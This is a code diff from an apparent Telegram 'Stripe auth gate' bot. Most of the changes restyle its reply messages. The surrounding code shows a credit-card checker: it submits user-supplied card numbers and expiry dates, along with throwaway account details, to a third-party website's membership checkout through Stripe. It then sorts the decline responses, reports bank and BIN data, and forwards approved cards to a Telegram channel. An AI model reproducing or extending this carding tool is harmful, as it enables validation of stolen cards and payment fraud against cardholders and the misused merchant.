@@ -34,13 +34,11 @@ async def ch(Client, message):
             print(verified_gps)
         else:
             text = f"""
-<b>〄</b> Gate: <b>STRIPE AUTH [chk]</b>
-
-<b>●</b> Process: <b>□□□□□□□□□□ 0% </b>
-<b>●</b> Time Taken: {get_time_taken(started_time)}'s
-<b>●</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
-
-<b> ● POWERED BY: <a href="tg://openmessage?user_id=1846020026">S P A R K Y</a></b>"""
+<b>❇️ [STRIPE AUTH GATE] ❇️
+┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ 
+✘ PROCESS: □□□□□□□□□□ 0% 
+✘ TIME TAKEN: {get_time_taken(started_time)}'s</b>
+"""
             msg = await message.reply_text(text=text,reply_to_message_id=message.message_id)
             await Client.send_chat_action(message.chat.id, "typing")
             find = maindb.find_one({"_id": message.from_user.id})
@@ -54,10 +52,10 @@ async def ch(Client, message):
                 role = find["status"]
                 if role == "P" and spam_time < 10:
                     time_left = 10 - spam_time
-                    await msg.edit_text(f"""<b> AntiSpam try again after {time_left}'s</b>""")
+                    await msg.edit_text(f""" AntiSpam try again after {time_left}'s""")
                 elif role == "F" and spam_time < 60:
                     time_left =  60 - spam_time
-                    await msg.edit_text(f"""<b> AntiSpam try again after {time_left}'s</b>""")
+                    await msg.edit_text(f""" AntiSpam try again after {time_left}'s""")
                 else:
                     if message.reply_to_message is not None:
                         message.text = message.reply_to_message.text
@@ -125,65 +123,68 @@ async def ch(Client, message):
                                 json_first = json.loads(res.text)
                                 if 'error' in json_first:
                                     text = f"""
-<b>〄</b> Gate: <b>STRIPE AUTH [chk]</b>
+<b>❇️ [STRIPE AUTH GATE] ❇️
 
-<b>●</b> Card: <code>{lista}</code>
-<b>●</b> Result: <b>REJECTED❌ [INCORRECT CARD]</b>
-<b>●</b> Bank Info: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
-<b>●</b> Bin Info: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
-<b>●</b> Time Taken: {get_time_taken(started_time)}'s
+✘ CARD: <code>{lista}</code>
+✘ RESULT: REJECTED❌ [INCORRECT CARD]
+┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ 
+✘ BANK INFO: {bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})
+✘ BIN INFO: <code>{bin}</code> - {bin_data['data']['level']} - {bin_data['data']['type']}
+┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ 
+✘ TIME TAKEN: {get_time_taken(started_time)}'s
 
-<b>●</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
-<b>●</b> POWERED BY: <b><a href="t.me/SPA4KY">S P A R K Y</a></b>"""
+✘ CHECKED BY: <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]
+✘ POWERED BY: SPA4KY</b>"""
                                     await msg.edit_text(text)
                                     antidb.set(message.from_user.id, int(time.time()))
                                 elif 'id' not in json_first:
                                     text = f"""
-<b>〄</b> Gate: <b>STRIPE AUTH [chk]</b>
+<b>❇️ [STRIPE AUTH GATE] ❇️
 
-<b>●</b> Card: <code>{lista}</code>
-<b>●</b> Result: <b>REJECTED❌ [Error]</b>
+✘ CARD: <code>{lista}</code>
+✘ RESULT: REJECTED❌ [ERROR]
 ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ 
-<b>●</b> Bank Info: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
-<b>●</b> Bin Info: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
+✘ BANK INFO: {bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})
+✘ BIN INFO: <code>{bin}</code> - {bin_data['data']['level']} - {bin_data['data']['type']}
 ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ 
-<b>●</b> Checked By: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
-<b>●</b> Time Taken: {get_time_taken(started_time)}'s
+✘ TIME TAKEN: {get_time_taken(started_time)}'s
 
-<b>●</b> POWERED BY: <b><a href="t.me/SPA4KY">S P A R K Y</a></b>"""
+✘ CHECKED BY: <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]
+✘ POWERED BY: SPA4KY</b>"""
                                     await msg.edit_text(text)
                                     antidb.set(message.from_user.id, int(time.time()))
                                 else:
                                     id = json_first["id"]
                                     text = f"""
-<b>〄</b> Gate: <b>STRIPE AUTH [chk]</b>
+<b>❇️ [STRIPE AUTH GATE] ❇️
 
-<b>●</b> Card: <code>{lista}</code>
-<b>●</b> Process: <b>■■■■■□□□□□ 50%</b>
+✘ CARD: <code>{lista}</code>
+✘ PROCESS: ■■■■■□□□□□ 50%
 ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ 
-<b>●</b> Bank Info: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
-<b>●</b> Bin Info: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
+✘ BANK INFO: {bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})
+✘ BIN INFO: <code>{bin}</code> - {bin_data['data']['level']} - {bin_data['data']['type']}
 ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ 
-<b>●</b> Checking By: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
-<b>●</b> Time Taken: {get_time_taken(started_time)}'s
+✘ TIME TAKEN: {get_time_taken(started_time)}'s
 
-<b>●</b> POWERED BY: <b><a href="t.me/SPA4KY">S P A R K Y</a></b>"""
+✘ CHECKED BY: <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]
+✘ POWERED BY: SPA4KY</b>"""
                                     await msg.edit_text(text)
                                     data = f"level=1&checkjavascript=1&other_discount_code=&username={get_username()}&password={password}&password2={password}&bemail={email}&bconfirmemail={email}&fullname=&gateway=stripe&CardType={vendor}&discount_code=&submit-checkout=1&javascriptok=1&submit-checkout=1&javascriptok=1&payment_method_id={id}&AccountNumber={cc}&ExpirationMonth={mes}&ExpirationYear={ano}"
                                     res = curl.post("https://www.voclr.it/membership-account/membership-checkout/",headers=headers,data=data)
                                     text = f"""
-<b>〄</b> Gate: <b>STRIPE AUTH [chk]</b>
+<b>❇️ [STRIPE AUTH GATE] ❇️
 
-<b>●</b> Card: <code>{lista}</code>
-<b>●</b> Process: <b>■■■■■■■■■■ 100%</b>
+✘ CARD: <code>{lista}</code>
+✘ PROCESS: ■■■■■■■■■■ 100%
 ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ 
-<b>●</b> Bank Info: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
-<b>●</b> Bin Info: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
+✘ BANK INFO: {bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})
+✘ BIN INFO: <code>{bin}</code> - {bin_data['data']['level']} - {bin_data['data']['type']}
 ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ 
-<b>●</b> Checking By: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
-<b>●</b> Time Taken: <b>{get_time_taken(started_time)}'s</b>
+✘ TIME TAKEN: {get_time_taken(started_time)}'s
 
-<b> ● POWERED BY: <a href="tg://openmessage?user_id=1846020026">S P A R K Y</a></b>"""
+✘ CHECKED BY: <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]
+ ✘ POWERED BY : SPA4KY</b>
+ """
                                     await msg.edit_text(text)
                                     try:
                                         if 'incorrect_zip' in res.text or 'Your card zip code is incorrect.' in res.text or 'The zip code you supplied failed validation' in res.text or 'card zip code is incorrect' in res.text: 
@@ -256,18 +257,18 @@ async def ch(Client, message):
                                             await msg.edit_text("✖️ PROXY DEAD ✖️")
                                         else:
                                             lasttext = f"""
-<b>〄</b> Gate: <b>STRIPE AUTH [chk]</b>
+❇️ [STRIPE AUTH GATE] ❇️
 
-<b>●</b> Card: <code>{lista}</code>
-<b>●</b> Result: <b>{response}{r_logo} [{r_text}]</b>
+✘ CARD: <code>{lista}</code>
+✘ RESULT: {response}{r_logo} [{r_text}]
 ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ 
-<b>●</b> Bank Info: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
-<b>●</b> Bin Info: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
+✘ BANK INFO: {bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})
+✘ BIN INFO: <code>{bin}</code> - {bin_data['data']['level']} - {bin_data['data']['type']}
 ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅ 
-<b>●</b> Time Taken: {get_time_taken(started_time)}'s
+✘ TIME TAKEN: {get_time_taken(started_time)}'s
 
-<b>●</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
-<b>●</b> POWERED BY: <b><a href="t.me/SPA4KY">S P A R K Y</a></b>"""
+✘ CHECKED BY: <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]
+✘ POWERED BY: SPA4KY"""
                                         await msg.edit_text(lasttext)
                                         if "✅" in lasttext:
                                             await Client.send_message(-1001752921824, lasttext)
